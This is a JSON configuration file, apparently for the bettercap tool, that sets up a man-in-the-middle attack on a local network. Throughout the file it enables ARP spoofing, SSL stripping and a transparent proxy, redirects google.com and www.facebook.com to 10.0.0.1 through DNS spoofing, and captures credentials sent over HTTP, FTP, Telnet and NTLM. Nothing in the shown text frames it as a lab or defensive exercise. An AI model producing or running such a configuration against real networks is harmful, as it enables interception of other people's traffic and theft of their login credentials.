{
  "net_interface": "eth0",
  "gateway_ip": "192.168.1.1",
  "http_proxy_port": 8080,
  "https_proxy_port": 8081,
  "transparent_proxy": true,
  "ssl_strip": true,
  "dns_spoof": {
    "domains": [
      "google.com",
      "www.facebook.com"
    ],
    "addresses": [
      "10.0.0.1",
      "10.0.0.1"
    ]
  },
  "arp_spoof": true,
  "icmp_redirects": false,
  "credentials_capture_targets": [
    "http",
    "ftp",
    "telnet",
    "ntlm"
  ],
  "session_hijacking": false,
  "log_file": "/var/log/bettercap/bettercap.log",
  "log_level": 3,
  "startup_modules": [
    {
      "name": "httpProxy",
      "enabled": true
    },
    {
      "name": "dnsProxy",
      "enabled": true
    },
    {
      "name": "tcpProxy",
      "enabled": false
    }
  ]
}
